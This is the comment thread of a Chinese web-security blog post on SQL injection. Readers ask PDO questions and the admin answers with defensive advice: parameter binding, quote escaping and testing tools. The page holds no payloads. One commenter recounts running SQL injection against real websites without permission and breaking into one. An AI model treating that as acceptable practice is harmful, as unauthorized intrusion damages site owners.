+                        <p><p>	1. 頁面跑的慢不慢跟 SQL 語法寫得好不好比較有關系， PDO 不會影響太多效能。<br />	&nbsp;</p><p>	這篇文章有 PDO 效能測試的數據</p><p>	http://archive.jnrbsn.com/2010/06/mysqli-vs-pdo-benchmarks</p><p>	&nbsp;</p><p>	2. 一般的用法 PDO 是要關閉，用 $dbh = null ，但是如果使用 <span style="color:#ff0000;">persistent connections</span> 就可以不用關閉。</p><p>	<span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 0, 187);">$dbh&nbsp;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">=&nbsp;new&nbsp;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 0, 187);">PDO</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">(</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(221, 0, 0);">&#39;mysql:host=localhost;dbname=test&#39;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">,&nbsp;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 0, 187);">$user</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">,&nbsp;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 0, 187);">$pass</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">,&nbsp;array(<br />	&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 0, 187);">PDO</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">::</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 0, 187);">ATTR_PERSISTENT&nbsp;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">=&gt;&nbsp;</span><span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 0, 187);">true</span><br />	<span style="font-family: &#39;Fira Mono&#39;, &#39;Source Code Pro&#39;, monospace; font-size: 14px; line-height: 24px; color: rgb(0, 119, 0);">));</span></p></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲</a>
+                    <span class="media-sub">2015/12/25</span>
+                </h4>
+                <p>上次的問題解決了, 謝謝@@<br /><br />又來請教了!!<br /><br />$num_float = &quot;2.5&quot;;<br /><br />其中要存入的資料是浮動變數, 那 PDO::PARAM_INT 是否正確?<br /><br />$updods->bindParam(1, $num_float, PDO::PARAM_INT);<br /></p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><div>	PDO 沒有支援浮點數的處理，所以要用這種寫法：</div><div>	&nbsp;</div><div>	$num_float = strval($num_float);</div><div>	&nbsp;</div><div>	$updods-&gt;bindParam(1, $num_float, PDO::PARAM_STR);</div><div>	&nbsp;</div><div>	&nbsp;</div></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲</a>
+                    <span class="media-sub">2015/12/22</span>
+                </h4>
+                <p>不好意思, 又來打擾了!!<br /><br />在網路上有看到要讀取資料的筆數寫法如下:<br /><br />$sth=$db->prepare(&quot;select count(*) from product where id=2&quot;);<br />$sth->execute();<br />$rowCount=$sth->fetchColumn();<br /><br />但依此法試了, 仍無法讀取筆數???</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><p>	這只是單純的 SQL 語法，語法本身看起來沒問題，程式的部分我有幫你測試過，也是正常的。</p><p>	如果<strong> id = 2</strong> 有一筆資料，那麼 $rowCount 會得到 1&nbsp;</p><p>	&nbsp;</p><p>	不過你是不是要用這個 SQL 語法 &nbsp; select count(*) from product &nbsp;，才能拿到整個 table &nbsp;的筆數。</p><p>	&nbsp;</p></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲希雅</a>
+                    <span class="media-sub">2015/12/15</span>
+                </h4>
+                <p>請問~<br /><br />$query = $db->prepare(&quot;select title,con from table where title like ?&quot;);<br /><br />當中有使用 like , 值要怎麼帶入?</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><p>	第一個 ? 代表 index 1 ， 第二個 ? 代表 index 2， bindValue 的時候使用數字 &nbsp;1, 2, 3, 4 即可</p><p>	&nbsp;</p><p>	範例如下：</p><p>	$query = $db-&gt;prepare(&quot;select title,con from table where title like ?&quot;);</p><p>	$query-&gt;bindValue(1, &#39;&#37;xxxxx&#37;&#39;, PDO::PARAM_STR);</p><p>	&nbsp;</p></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲</a>
+                    <span class="media-sub">2015/11/26</span>
+                </h4>
+                <p>再請問, 有在網路上看到寫 &quot;PHP 5.1以後才可以用PDO&quot;, 那我們的版本是 4, 不就不能使用了?</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><p>	網路上可以查到 PHP 4 用的 PDO 版本</p><p>	例如 :&nbsp;http://www.phpclasses.org/package/2572-PHP-PDO-database-abstraction-interface-for-PHP-4.html</p></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲</a>
+                    <span class="media-sub">2015/11/26</span>
+                </h4>
+                <p>但如果php的版本是4, 直接用 intval() 或 addslashes() 囉?</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><p>	建議用這種方式，直接把單引號、雙引號轉成&nbsp;<span style="font-weight: bold; color: rgb(106, 106, 106); font-family: arial, sans-serif; font-size: small; line-height: 12.1333px;">numeric character reference</span><span style="color: rgb(84, 84, 84); font-family: arial, sans-serif; font-size: small; line-height: 12.1333px;">&nbsp;(</span><span style="font-weight: bold; color: rgb(106, 106, 106); font-family: arial, sans-serif; font-size: small; line-height: 12.1333px;">NCR</span><span style="color: rgb(84, 84, 84); font-family: arial, sans-serif; font-size: small; line-height: 12.1333px;">) ，</span></p><p>	&nbsp;</p><p>	<span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">$</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);">str </span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">=</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> </span><span class="str" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(221, 17, 68);">&quot;&#39;&quot;&quot;</span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">;</span></p><p>	<span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">$</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);">replace </span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">=</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> array</span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">(</span><span class="str" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(221, 17, 68);">&quot;&#39;&quot;</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> </span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">=&gt;</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> </span><span class="str" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(221, 17, 68);">&quot;&amp;#39;&quot;</span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">,</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> </span><span class="str" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(221, 17, 68);">&quot;&quot;&quot;</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> </span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">=&gt;</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> </span><span class="str" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(221, 17, 68);">&quot;&amp;quot;&quot;</span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">);</span></p><p>	<span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">$</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);">str </span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">=</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> strtr</span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">($</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);">str</span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">,</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);"> </span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">$</span><span class="pln" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(72, 72, 76);">replace</span><span class="pun" style="line-height: 18px; font-family: monospace; font-size: 16px; white-space: pre; color: rgb(59, 89, 58);">);</span></p><p class="L2" style="margin: 0px; padding: 0px 0px 0px 12px; color: rgb(0, 89, 91); line-height: 18px; text-shadow: rgb(255, 255, 255) 0px 1px 0px;">	&nbsp;</p><p>	或是用文章中提到的 PDO Library&nbsp;<a href="http://php.net/manual/en/book.pdo.php " target="_blank">http://php.net/manual/en/book.pdo.php&nbsp;</a></p></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">charles</a>
+                    <span class="media-sub">2014/06/25</span>
+                </h4>
+                <p>目前所知許多網站相關的SQL注入弱點都已經防堵了,請問一下你有相關的免費測試軟體(SQL注入)<br />或網站資源可提供測試嗎? <br /></p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><ul class="vj-ul" style="padding: 0px; margin: 0px; font-family: &#39;Lucida Grande&#39;, &#39;Hiragino Sans GB&#39;, 微軟正黑體, &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 16.363636016845703px; letter-spacing: 0.30000001192092896px; background-color: rgb(255, 255, 255);"><ol><li style="line-height: 30px;"><span style="color: rgb(51, 51, 51); line-height: 1.8;" class=""><a href="http://www.parosproxy.org/index.shtml">paros</a><span class="SME_newbr" id="simple_newqq1"></span></span></li><li><font color="#333333"><span style="line-height: 26.776859283447266px;">OWASP</span></font></li></ol></ul></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">charles</a>
+                    <span class="media-sub">2014/06/03</span>
+                </h4>
+                <p>請問一下,aspx SQL Injection 的手法如何? 可提供相關的經驗並且介紹一下嗎?謝謝!!</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p>Database 有很多種，一種是 &nbsp;Mysql 常搭配 apache 一起使用，還有一種是 Mssql 常搭配 &nbsp;IIS , asp 一起使用，我想你問的是 Mssql 的 SQL Injection 吧?&nbsp;<div>其實這兩個 &nbsp;Database ，攻擊方式大同小異，我並沒有特別為 Mssql 去做深入研究。</div></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">Volar</a>
+                    <span class="media-sub">2014/02/22</span>
+                </h4>
+                <p>學習了!!!</p>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">George</a>
+                    <span class="media-sub">2013/11/07</span>
+                </h4>
+                <p>  我之前學習相關課程時,就在一些知名網站試過類似的SQL Injection,有個大網站還真的被入侵成功了,我寄e-mail去通知他們,結果他們竟然沒有理會= =+,一直到現在還是一樣~這些人對資安的觀念實在是無言...</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p>不要怪他們!! 台灣在這方面還蠻落後的， 我也曾經年少不懂事過，寫過很多有漏洞的程式，這幾篇文章，是希望大家對於網頁安全性方面能夠有所提升。</p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">版大你好</a>
+                    <span class="media-sub">2013/11/06</span>
+                </h4>
+                <p>版大對於SQL注入 整理的不錯<br />不過 可否請問一下 如何知道 上面輸入的指令碼<br />交給資料庫時 又是如何解釋? (我非常想要知道)<br />可以自己安裝資料庫，自己測試嗎?<br />我想每個資料庫 對於指令碼的解釋 應該會不同<br />還有最後一點 我也想要知道 SQL注入是否可以完全過濾掉?</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p>1. 安裝資料庫並不難，在 windows 下，你可以安裝 xampp + phpmyadmin，就可以透過 Browser 去操作 SQL 語法。<div><br /><div><div>2. SQL Injection 是否可以完全過瀘的問題，我建議你可以使用 PDO Library ，並按照 PDO bindValue 的方式，組合出正確的 SQL 語法，當然我只能跟你說，</div><div>這個方式有 99.99&#37; 是安全的，留下 0.01 &#37; 是因為這世界上的頂極駭客是我無法想像的。</div></div></div></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+    </ul>
+</div>
+
+
+
+    <div class="comment-group">
+        <h2>回應 (Leave a comment)</h2>
+        <form class="form form-comment" method="post">
+            <input type="hidden" name="act" value="reply">
+            <input type="hidden" name="parentId" value="vy+3iFRjsObTW572QggHVwXKsizUaDoSVHo4ZXe1UK6CpMhi3cuplyqleBvO8lFqaZ9TGMh/vg5JQ2QC9yupn4" />
+            <a class="form-thumb" href="#"><img src="//www.puritys.me/templates/static/images/thumb_nobody.png"></a>
+            <div class="form-body">
+                <div class="form-row ">
+                    <label class="form-label" for="name">Name</label>
+                    <div class="form-input">
+                        <input id="name" class="form-control" name="name" type="text" value="">
+                        <span class="form-message">
+                            
+                        </span>
+                    </div>
+                </div>
+                <div class="form-row ">
+                    <label class="form-label" for="email">E-mail</label>
+                    <div class="form-input">
+                        <input id="email" class="form-control" name="email" type="text" value="">
+                        <span class="form-message">
+                            
+                        </span>
+                    </div>
+                </div>
+                <div class="form-row ">
+                    <label class="form-label" for="message">Message</label>
+                    <div class="form-input">
+                        <textarea id="message" name="message" class="form-control"></textarea>
+                        <span class="form-message">
+                            
+                        </span>
+                    </div>
+                </div>
+                
+
+                
+
+                
+                <div class="form-row security_codeBox">
+                    <label class="form-label">
+                    </label>
+                    <div class="form-input">
+                        <div class="cf-turnstile" data-sitekey="0x4AAAAAAABkD-WnGwGW7PRq"></div>
+                        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+                        <span class="form-message">
+                            
+                        </span>
+                    </div>
+                </div>
+                
+
+                <div class="form-action">
+                    <button class="btn">Submit</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+
+
+        
+            
+    </div>
+    
+
+            
+    <div class="sidebar">
+        
+                
+
+<div class="list-group">                                                                                                                            
+    <h4 class="list-group-heading">SQL 相關</h4>
+    <ul>
+    
+        <li><a href="/docs-blog/article-451-使用-java-h2database-測試-MySQL-unit-test.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_451&quot;}'>使用 java h2database 測試 MySQL unit test </a></li>
+    
+        <li><a href="/docs-blog/article-350-MySql-varchar-要使用-utf8_general_ci,-utf8_unicode_ci-還是-ascii_bin-呢.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_350&quot;}'>MySql  varchar  要使用  utf8_general_ci, utf8_unicode_ci 還是 ascii_bin 呢 </a></li>
+    
+        <li><a href="/docs-blog/article-304-Mysql-Replication-設定.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_304&quot;}'>Mysql Replication 設定 </a></li>
+    
+        <li><a href="/docs-blog/article-121-node.js-使用-mysql-教學.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_121&quot;}'>node.js 使用 mysql 教學 </a></li>
+    
+        <li><a href="/docs-blog/article-76-Mysql-語法-基礎篇.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_76&quot;}'>Mysql 語法 基礎篇 </a></li>
+    
+    </ul>
+</div>
+
+<div class="list-group">                                                                                                                            
+    <h4 class="list-group-heading">駭客 相關</h4>
+    <ul>
+    
+        <li><a href="/docs-blog/article-204-我被-Google-駭客攻擊了.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_204&quot;}'>我被 Google 駭客攻擊了 </a></li>
+    
+        <li><a href="/docs-blog/article-78-XSS-攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_78&quot;}'>XSS 攻擊 </a></li>
+    
+    </ul>
+</div>
+
+<div class="list-group">                                                                                                                            
+    <h4 class="list-group-heading">類別 網路安全</h4>
+    <ul>
+    
+        <li><a href="/docs-blog/article-376-HTTP-:-SSLv3-漏洞---Poodle-攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_376&quot;}'>HTTP : SSLv3  漏洞  - Poodle 攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-367-IceCTF-2016-challenges.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_367&quot;}'>IceCTF 2016  challenges </a></li>
+    
+        <li><a href="/docs-blog/article-346-SYN-flood-attack-：封包-DOS-攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_346&quot;}'>SYN flood attack ：封包 DOS 攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-276-網路安全相關-Blog.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_276&quot;}'>網路安全相關 Blog </a></li>
+    
+        <li><a href="/docs-blog/article-251-OpenSSL-CVE-2014-0160-Heartbleed-漏洞.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_251&quot;}'>OpenSSL CVE-2014-0160 Heartbleed  漏洞 </a></li>
+    
+        <li><a href="/docs-blog/article-249-Chrome-Extension-MultiLogin-駭客盜帳號?.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_249&quot;}'>Chrome Extension MultiLogin 駭客盜帳號? </a></li>
+    
+        <li><a href="/docs-blog/article-236-DNS-HIJACKING-說明與防護.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_236&quot;}'>DNS HIJACKING  說明與防護 </a></li>
+    
+        <li><a href="/docs-blog/article-226-六種常見的駭客攻擊方式.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_226&quot;}'>六種常見的駭客攻擊方式 </a></li>
+    
+        <li><a href="/docs-blog/article-212-網站路徑駭客攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_212&quot;}'>網站路徑駭客攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-205-Google-Spider-Hacked-My-Website.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_205&quot;}'>Google Spider Hacked My Website </a></li>
+    
+    </ul>
+</div>
+
+
+        
+                
+
+
+        
+            
+    </div>
+    
+        
+</div>
+
+
+
+    
+
+            
+<div class="bottom-footer">
+    <ul class="nav">
+        
+        <li >
+            <a href="/news">網路新聞</a>
+        </li>
+        
+        <li >
+            <a href="/life">生活旅遊</a>
+        </li>
+        
+        <li class="active">
+            <a href="/WEB_SECURITY">網路安全</a>
+        </li>
+        
+        <li >
+            <a href="/docs-cate">程式雜記</a>
+        </li>
+        
+
+        <li>
+            <a href="https://www.puritys.me/">puritys.me</a>
+        </li>
+        <li>
+            <a href="http://www.lingihuang.com/">VIVIAN CRAP</a>
+        </li>
+        
+    </ul>
+    <p>Copyright &amp;copy; 2014 PURITYS.COM. All rights reserved.</p>
+</div>
+
+
+            
+<script src="https://connect.facebook.net/en_US/all.js"></script>
+
+
+        
+</body>
+    <script src="/templates/static/js/files?sidebar.js&ezHTML_main.js&?v=20180416-2"></script>
+</html>
